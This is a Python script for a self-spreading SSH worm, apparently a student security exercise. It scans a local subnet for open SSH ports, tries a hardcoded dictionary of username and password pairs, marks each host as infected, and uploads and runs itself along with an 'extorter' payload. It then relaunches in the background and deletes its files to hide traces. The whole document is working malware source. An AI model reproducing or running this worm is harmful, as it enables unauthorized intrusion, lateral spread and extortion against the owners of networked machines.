import paramiko
import sys
import nmap
import urllib
import socket
from subprocess import call
import tarfile
from time import sleep
 
# File marking the presence of a worm in a system
INFECTION_MARKER = "/tmp/infectionMarker.txt"
  
  
# List of credentials for Dictionary Attack
DICTIONARYATTACK_LIST = {
        'crazy': 'things',
        'nsf': '456',
        'security': 'important',
        'ubuntu': '123456'
        }
  
#############################################
#Creates a marker file on the target system
#############################################
def markInfected():
    marker = open(INFECTION_MARKER, "w")
    marker.write("I have infected your system")
    marker.close()
  
  
#######################################################
#Checks if target system is infected
#@return - True if System is infected; False otherwise
#@param - sshC : Handle for ssh Connection
#######################################################
def isInfected(sshC):
    infected = False
  
    try:
        sftpClient = sshC.open_sftp()
        sftpClient.stat(INFECTION_MARKER)
        infected = True
          
    except IOError, e:
        print("This system is not Infected ")  
  
    return infected   
      
###########################################
#Returns IP of the current System
###########################################
def getMyIP():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('4.2.2.2', 80))
        return s.getsockname()[0]
 
  
##########################################################
#Scans the Network to check Live hosts on Port 22
#@return - a list of all IP addresses on the same network
###########################################################
def getHostsOnTheSameNetwork():
    portScanner = nmap.PortScanner()
    portScanner.scan('192.168.1.0/24', arguments = '-p 22 --open')
    hostInfo = portScanner.all_hosts()
    liveHosts = []
    for host in hostInfo:
        if portScanner[host].state() == "up":
            liveHosts.append(host)
    print("My IP is: "+ getMyIP())
    liveHosts.remove(getMyIP())
    return liveHosts
  
#########################################################
#Removes all the worm traces from the remote host
########################################################
def cleanTraces(ssh):
    try:
	sftpClient = ssh.open_sftp()
	sleep(1)
	sftpClient.unlink("/tmp/DocumentsDir.tar")
	sftpClient.unlink("/tmp/extorter_worm.py")
	sftpClient.unlink("/tmp/extorter.py")
	sftpClient.unlink("/tmp/openssl")
	print("Cleaned up all traces")
    except:
	print("Files does not exist")



##############################################################
#Performs following functionalities:
#1. Checks if '/home/cpsc/Documents' folder exists
#2. Copy extorter.py into remote location (extorter.py - Responsible for executing extortion functions)
#3. Execute and spread worm 
##############################################################
def extort(ssh):
       
    #Open connection with the remote system
    sftpClient = ssh.open_sftp()
     #Check if /home/cpsc/Documents Dir exists
    try:
    	sftpClient.stat("/home/cpsc/Documents")
        #Download openssl program  
	sftpClient.put("/tmp/extorter.py", "/tmp/extorter.py")
	ssh.exec_command("chmod a+x /tmp/extorter.py")
	ssh.exec_command("python -u /tmp/extorter.py > /tmp/ext.output")
	print("Copied and executed remote code into the victim system")
	ssh.exec_command("nohup python -u /tmp/extorter_worm.py > /tmp/worm.output &")
	cleanTraces(ssh)
    except:
	sleep(1)
	sftpClient.unlink("/tmp/extorter_worm.py")
        e = sys.exc_info()
	print(e)
  


############################################
#Exploits the target system
##########################################
def launchAttack(ssh):
    print("Expoiting Target System")
    sftpClient = ssh.open_sftp()
    try:
        sftpClient.put("/tmp/extorter_worm.py","/tmp/extorter_worm.py")
        ssh.exec_command("chmod a+x /tmp/extorter_worm.py")
    	print("Copied worm into the system...")
	extort(ssh)
    except:
        print("Failed to Execute worm")
     
 
##############################################
#Tries login with the Target System
#@param hostIP - IP of target system
#@param userName - the username
#@param passWord - the password
#@return - ssh
#############################################
def attackSystem(hostIP, userName, passWord):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostIP, username = userName, password = passWord)
    return ssh
 
 
 
 
#########################################################################
#Tries to find correct Credentails in the available Dictionary
#@param - hostIp - IP of a client is sent ot test if login is sucessful
#@return - return sshConnection handle if Successful Login else,
#returns False
#########################################################################
def checkCredentials(hostIp):
    ssh = False
      
    for k in DICTIONARYATTACK_LIST.keys():
        try:
            ssh = attackSystem(hostIp, k, DICTIONARYATTACK_LIST[k])
            if ssh:
                return ssh
        except:
            pass   
    print("Could not login to the system")
    return ssh
      
 
##############################################################
#This is start of the replicator worm
##############################################################
         
print("Started infecting the network .....")
  
#Get all hosts in the network
discoveredHosts = getHostsOnTheSameNetwork()
markInfected()
 
 
for host in discoveredHosts:
    print(host + " under Observation ...")
    ssh = None
    try:
        ssh = checkCredentials(host)
        print(str(ssh) + "Testing")
        if ssh:
            print("Successfully cracked Username and password of "+host)
            if not isInfected(ssh):
                launchAttack(ssh)
                #extort(ssh)
		#cleanTraces(ssh)
                ssh.close()
                break
            else:
                print(host + " is already infected")
    except socket.error:
        print("System no longer Up !")
    except paramiko.ssh_exception.AuthenticationException:
        print("Wrong Credentials")
    print("---------------------")
print("I am done now !!")
